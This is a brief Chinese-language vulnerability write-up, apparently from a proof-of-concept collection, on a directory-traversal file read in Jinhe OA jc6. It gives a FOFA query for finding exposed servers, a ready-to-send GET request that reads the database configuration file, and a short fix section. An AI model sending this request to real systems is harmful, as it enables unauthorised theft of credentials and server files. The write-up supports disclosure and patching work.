---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA oaplusrangedownloadfile 任意文件读取漏洞

# 漏洞描述

金和OA（jc6 平台）的 `JHSoft.WCF/login/oaplusrangedownloadfile` 接口中 `filename` 参数未做有效校验，存在任意文件读取漏洞。未授权的远程攻击者可通过目录遍历读取服务器任意文件，如 `db.properties` 数据库配置文件。

影响范围

金和OA jc6

# 漏洞复现

FOFA：app="金和网络-金和OA"

POC：

```
GET /jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties HTTP/1.1
Host: target
```

`filename` 参数可替换为任意路径，直接返回文件内容。

# 修复方案

对 `filename` 参数做严格白名单校验，禁止目录遍历；联系厂商获取官方补丁并升级。
